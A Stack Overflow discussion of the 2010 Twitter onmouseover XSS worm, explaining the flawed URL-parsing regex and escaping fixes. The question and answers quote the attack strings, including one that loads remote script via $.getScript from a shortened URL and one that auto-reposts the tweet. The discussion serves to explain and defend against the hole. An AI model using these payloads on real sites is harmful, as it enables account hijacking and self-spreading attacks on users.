<?xml version="1.0" encoding="utf-8"?>
<post><title>javascript - Today's XSS onmouseover exploit on twitter.com - Stack Overflow</title><question><text><div class="post-text" itemprop="text">
<p>Can you explain what exactly happened on Twitter today? Basically the exploit was causing people to post a tweet containing this link:  </p>
<pre>http://t.co/@"style="font-size:999999999999px;"onmouseover="$.getScript('http:\u002f\u002fis.gd\u002ffl9A7')"/</pre>
<p>Is this technically an XSS attack or something else?</p>
<p>Here is how the Twitter home page looked like: <a href="http://www.flickr.com/photos/travelist/6832853140/" rel="noreferrer">http://www.flickr.com/photos/travelist/6832853140/</a></p>
</div></text><author><a href="/users/5475/ibz">ibz</a></author><comments><comment><text><span class="comment-copy">It's an XSS attack See <a href="http://twitter.com/safety/status/25118959058" rel="nofollow noreferrer">twitter.com/safety/status/25118959058</a></span></text><author><a class="comment-user" href="/users/284685/adam" title="23,607 reputation">Adam</a></author></comment><comment><text><span class="comment-copy">OK, but I'd like to see a better explanation. How does it work? What can we do to avoid this kind of vulnerability in the code we write?</span></text><author><a class="comment-user owner" href="/users/5475/ibz" title="12,550 reputation">ibz</a></author></comment><comment><text><span class="comment-copy">Also see <a href="http://blog.twitter.com/2010/09/all-about-onmouseover-incident.html" rel="nofollow noreferrer">blog.twitter.com/2010/09/all-about-onmouseover-incident.html</a></span></text><author><a class="comment-user" href="/users/139010/matt-ball" title="242,981 reputation">Matt Ball</a></author></comment></comments></question><answers><answer><text><div class="post-text" itemprop="text">
<p>The vulnerability is because URLs were not being parsed properly. For example, the following URL is posted to Twitter:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="pln">http</span><span class="pun">:</span><span class="com">//thisisatest.com/@"onmouseover="alert('test xss')"/</span></code></pre>
<p>Twitter treats this as the URL. When it is parsed Twitter wraps a link around that code, so the HTML now looks like:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="tag">&lt;a</span><span class="pln"> </span><span class="atn">href</span><span class="pun">=</span><span class="atv">"http://thisisatest.com/@"</span><span class="atn">onmouseover</span><span class="pun">=</span><span class="atv">"</span><span class="pln">alert</span><span class="pun">(</span><span class="str">'test xss'</span><span class="pun">)</span><span class="atv">"</span><span class="atn">rel</span><span class="pun">/</span><span class="atv">" target="</span><span class="pln">_</span><span class="atn">blank</span><span class="atv">" =""&gt;</span><span class="pln">http://thisisatest.com/@"onmouseover="alert('test xss')"/</span><span class="tag">&lt;/a&gt;&lt;/span&gt;</span><span class="pln"> </span></code></pre>
<p>You can see that by putting in the URL and the trailing slash, Twitter thinks it has a valid URL even though it contains a quote mark in it which allows it to escape (ie. terminate the <code>href</code> attribute, for the pedants out there) the URL attribute and include a mouse over. You can write anything to the page, including closing the link and including a script element. Also, you are not limited by the 140 character limit because you can use <code>$.getScript()</code>.</p>
<p><a href="http://github.com/mzsanford/twitter-text-rb/commit/cffce8e60b7557e9945fc0e8b4383e5a66b1558f" rel="noreferrer">This</a> commit, if it were pulled, would have prevented this XSS vulnerability.</p>
<p>In detail, the offending regex was:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="pln">REGEXEN</span><span class="pun">[:</span><span class="pln">valid_url_path_chars</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="pun">/(?:</span><span class="pln">
  </span><span class="com">#{REGEXEN[:wikipedia_disambiguation]}|</span><span class="pln">
  </span><span class="pun">@[^</span><span class="pln">\/</span><span class="pun">]+</span><span class="pln">\/</span><span class="pun">|</span><span class="pln">
  </span><span class="pun">[</span><span class="pln">\.\,</span><span class="pun">]?#{</span><span class="pln">REGEXEN</span><span class="pun">[:</span><span class="pln">valid_general_url_path_chars</span><span class="pun">]}</span><span class="pln">
</span><span class="pun">)/</span><span class="pln">ix</span></code></pre>
<p>The <code>@[^\/]+\/</code> part allowed any character (except a forward slash) when it was prefixed by an @ sign and suffixed by a forward slash.</p>
<p>By changing to <code>@#{REGEXEN[:valid_general_url_path_chars]}+\/</code> it now only allows valid URL characters.</p>
</div></text><author><a href="/users/149530/michael-foukarakis">Michael Foukarakis</a></author><comments><comment><text><span class="comment-copy">Who said anything about backslashes? HTML-encoding out-of-band characters is generally considered a type of escaping too.</span></text><author><a class="comment-user" href="/users/18936/bobince" title="387,718 reputation">bobince</a></author></comment><comment><text><span class="comment-copy">@Michael Foukarakis thanks for fixing the wording.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">@bobince I disagree.  In my mind this is very different from re-encoding and wikipedia backs my argument <a href="http://en.wikipedia.org/wiki/Escape_character" rel="nofollow noreferrer">en.wikipedia.org/wiki/Escape_character</a></span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">@Rook: same page: “The ampersand (&amp;) character may be considered as an escape character in SGML and derived formats such as HTML and XML.”</span></text><author><a class="comment-user" href="/users/18936/bobince" title="387,718 reputation">bobince</a></author></comment><comment><text><span class="comment-copy">@bobince  Yeah but its not <code>&amp;'</code>,  its not creating a character literal single quote and the literal aspect makes it distinct in my mind.  Although it is creating an "alternative interpretation" of a character.  Never the less i think this posts current wording is more clear.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">@Rook, I am not arguing with what you are saying, I know you are very knowledgeable about internet security (far far more than myself). However, (even tho its usually always accurate) anyone can write anything on Wikipedia.</span></text><author><a class="comment-user" href="/users/46011/jd-isaacks" title="22,168 reputation">JD Isaacks</a></author></comment><comment><text><span class="comment-copy">Cool, and surprising that it went unnoticed until now</span></text><author><a class="comment-user" href="/users/118817/eds" title="431 reputation">eds</a></author></comment><comment><text><span class="comment-copy">Very good explanation! So the solution would be to consider the URL as ending when you get to the quotes, right? The eternal discussion on how to detect URLs in a text. <a href="http://www.codinghorror.com/blog/2008/10/the-problem-with-urls.html" rel="nofollow noreferrer">codinghorror.com/blog/2008/10/the-problem-with-urls.html</a></span></text><author><a class="comment-user owner" href="/users/5475/ibz" title="12,550 reputation">ibz</a></author></comment><comment><text><span class="comment-copy">This is an accurate analysis of the code in question.</span></text><author><a class="comment-user" href="/users/211776/bcherry" title="5,504 reputation">bcherry</a></author></comment></comments></answer><answer><text><div class="post-text" itemprop="text">
<p>Yes this is XSS,  it is attacking a <a href="http://www.elated.com/articles/events-and-event-handlers/" rel="noreferrer">javascript event handler</a>.  What is cool about this XSS is that it doesn't require <code>&lt;&gt;</code> to exploit.  The injected string is: <code>size:999999999999px;"onmouseover="$.getScript('http:\u002f\u002fis.gd\u002ffl9A7')"</code>.</p>
<p>The <code>size::999999999999px</code> makes it very large and there for more likly that someone will mouse over it.  The real problem is the <code>onmouseover=</code> event handler. </p>
<p>To prevent this in PHP you need to convert quote marks into their html entities:
<code>$var=htmlspecialchars($var,ENT_QUOTES);</code></p>
<p>This is because HTML you cannot escape quotes like sql: <code>\'</code></p>
</div></text><author><a href="/users/183528/rook">rook</a></author><comments><comment><text><span class="comment-copy">Rook, what would have blocked the attack? Escaping out the quotes?</span></text><author><a class="comment-user" href="/users/131926/steven-sudit" title="16,297 reputation">Steven Sudit</a></author></comment><comment><text><span class="comment-copy">@Steven Sudit HTML doesn't respect "escaped" quote marks like sql: <code>\'</code>,  so you can't use <code>addslashes()</code>.  Instead you have to convert the quotes into their html entities. I have updated my response.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">@Rook: I believe you have a typo - "ENT_QUOTS" should be "ENT_QUOTES"</span></text><author><a class="comment-user" href="/users/151382/stephen-watkins" title="12,760 reputation">Stephen Watkins</a></author></comment><comment><text><span class="comment-copy">@stjowa  and thats why stack overflow is wiki style.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">It is, but stjowa doesn't have the rep needed to edit your typo.</span></text><author><a class="comment-user" href="/users/131926/steven-sudit" title="16,297 reputation">Steven Sudit</a></author></comment><comment><text><span class="comment-copy">@Rook: Does PHP's version of HtmlEncode convert single-quotes to entities?</span></text><author><a class="comment-user" href="/users/131926/steven-sudit" title="16,297 reputation">Steven Sudit</a></author></comment><comment><text><span class="comment-copy">@Steven Sudit I am not familiar with that function.  I would use htmlspecialchars with ENT_QUOTES.    Or you could just test it,  try passing it <code>'"</code> and see if it converts.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">Technically <code>ENT_QUOTES</code> aren't needed for this particular example because <code>"</code> is escaped by <code>htmlspecialchars()</code> by default. It is only the single-quote character <code>'</code> that isn't escaped without <code>ENT_QUOTES</code>. Single quotes are used for attribute delimiters much less often than double, but it's still a good idea to always use <code>ENT_QUOTES</code> for safety.</span></text><author><a class="comment-user" href="/users/18936/bobince" title="387,718 reputation">bobince</a></author></comment><comment><text><span class="comment-copy">I was reading about this attack earlier and the Norwegian guy who did it claimed it. Can he not get arrested?</span></text><author><a class="comment-user" href="/users/46011/jd-isaacks" title="22,168 reputation">JD Isaacks</a></author></comment><comment><text><span class="comment-copy">@John Isaacks yeah probably,  he is breaking the law.  Twitter could also sue him.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">@bobince good point he does use single quotes in the exploit but he could have gotten away with only using double-quotes.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">It turn out that, as Wade suggested, the parser choked on @ followed by a quote. The result was that lack of escaping.</span></text><author><a class="comment-user" href="/users/131926/steven-sudit" title="16,297 reputation">Steven Sudit</a></author></comment></comments></answer><answer><text><div class="post-text" itemprop="text">
<p>The exploit was a classic piece of Javascript injection. Suppose you write a tweet with the following text:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="str">"http://www.guardian.co.uk/technology is the best!"</span></code></pre>
<p>When you view the Twitter web page, that becomes a link, like so:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="tag">&lt;a</span><span class="pln"> </span><span class="atn">href</span><span class="pun">=</span><span class="atv">"http://www.guardian.co.uk/technology"</span><span class="pln"> </span><span class="atn">class</span><span class="pun">=</span><span class="atv">"tweet-url web"</span><span class="pln"> 
 </span><span class="atn">rel</span><span class="pun">=</span><span class="atv">"nofollow"</span><span class="tag">&gt;</span><span class="pln">http://www.guardian.co.uk/technology</span><span class="tag">&lt;/a&gt;</span><span class="pln"> is the best!</span></code></pre>
<p>The exploit attacked that link-making function. The raw text of the exploit tweet would read something like this:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="pln">http</span><span class="pun">:</span><span class="com">//a.no/@";onmouseover=";$('textarea:first').val(this.innerHTML);</span><span class="pln">
   $</span><span class="pun">(</span><span class="str">'.status-update-form'</span><span class="pun">).</span><span class="pln">submit</span><span class="pun">();</span><span class="str">"class="</span><span class="pln">modal</span><span class="pun">-</span><span class="pln">overlay</span><span class="str">"/</span></code></pre>
<p>Which Twitter didn't protect properly, probably because the @" character combination broke their [HTML] parser. That link would generate the following page source:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="tag">&lt;a</span><span class="pln"> </span><span class="atn">href</span><span class="pun">=</span><span class="atv">"http://a.no/@"</span><span class="pln">;</span><span class="atn">onmouseover</span><span class="pun">=</span><span class="atv">"</span><span class="pun">;</span><span class="pln">$</span><span class="pun">(</span><span class="str">'textarea:first'</span><span class="pun">).</span><span class="pln">val</span><span class="pun">(</span><span class="kwd">this</span><span class="pun">.</span><span class="pln">innerHTML</span><span class="pun">);</span><span class="pln">
 $</span><span class="pun">(</span><span class="str">'.status-update-form'</span><span class="pun">).</span><span class="pln">submit</span><span class="pun">();</span><span class="atv">"</span><span class="atn">class</span><span class="pun">=</span><span class="atv">"modal-overlay"</span><span class="pun">/</span><span class="pln"> </span><span class="atn">class</span><span class="pun">=</span><span class="atv">"tweet-url web"</span><span class="pln">
      </span><span class="atn">rel</span><span class="pun">=</span><span class="atv">"nofollow"</span><span class="tag">&gt;</span></code></pre>
<p>This means that executable content (the onMouseOver="stuff" bit) has ended up in the page source code. Not knowing any better, the browser runs this code. Because it's running in the user's browser, it can do anything the user does; most variations used this power to re-post the content, which is why it spread like a virus. To encourage the user to activate the code by mousing over, they also formatted the block as black-on-black using CSS [Cascading Style Sheets, which determines the page layout]. Other versions were hacked around by users to have all sorts of other effects, such as porn site redirects, rainbow text in their tweets, and so forth. Some of them popped up dialog boxes designed to alarm the users, talking about accounts being disabled or passwords stolen (they weren't, in either case).</p>
<p>Twitter fixed this not by blocking the string onMouseOver (which some dim-witted blogs were calling for) but by properly sanitising the input. The " marks in these tweets are now turned into " – the HTML-escaped form.</p>
<p>Technically this is a second-order injection attack; the attack string is inserted into the database and handled correctly, but then the attack takes place as the string is read back out instead. It's not that complex an attack at all either - rather embarrassing for Twitter that they were caught out by this.</p>
<p>Source: <a href="http://www.guardian.co.uk/technology/blog/2010/sep/21/twitter-hack-explained-xss-javascript" rel="nofollow">The Twitter hack: how it started and how it worked</a></p>
</div></text><author><a href="/users/146857/chendur-pandian">Chendur Pandian</a></author><comments/></answer><answer><text><div class="post-text" itemprop="text">
<p>It's an XSS exploit. <a href="http://twitter.com/safety/status/25118959058" rel="nofollow noreferrer">As Twitter admitted in their update.</a> You can prevent attacks like that by never allowing users to post javascript code. You should always filter it out. More information about avoiding XSS can be found here: <a href="http://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29" rel="nofollow noreferrer">http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></p>
</div></text><author><a href="/users/284685/adam">Adam</a></author><comments><comment><text><span class="comment-copy">Reading others' comments, I'm a bit confused by your answer. How would you filter out javascript code as you say? (newbie question)</span></text><author><a class="comment-user" href="/users/382818/zabba" title="40,491 reputation">Zabba</a></author></comment><comment><text><span class="comment-copy">@Zabba it depends on what framework you're using. Django for example has autoescaping tools built in as do many other frameworks. Basically the idea is never let a use enter text and then render it back onto the page without filtering out script tags, possibly all or most html tags and if you allow html tags take out javascript event handlers in them</span></text><author><a class="comment-user" href="/users/284685/adam" title="23,607 reputation">Adam</a></author></comment></comments></answer><answer><text><div class="post-text" itemprop="text">
<p>From Wikipedia: "Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications that enables malicious attackers to inject client-side script into web pages viewed by other users."</p>
<p>Today's attack fits the bill to me.</p>
<p>Basically there was some sort of parsing error with Twitter.com display code.  When they converted URLs to HTML hyperlinks, they weren't handling @ characters correctly and this was causing javascript events to be inserted into the HTML link.</p>
</div></text><author><a href="/users/342519/wade-tandy">Wade Tandy</a></author><comments/></answer></answers></post>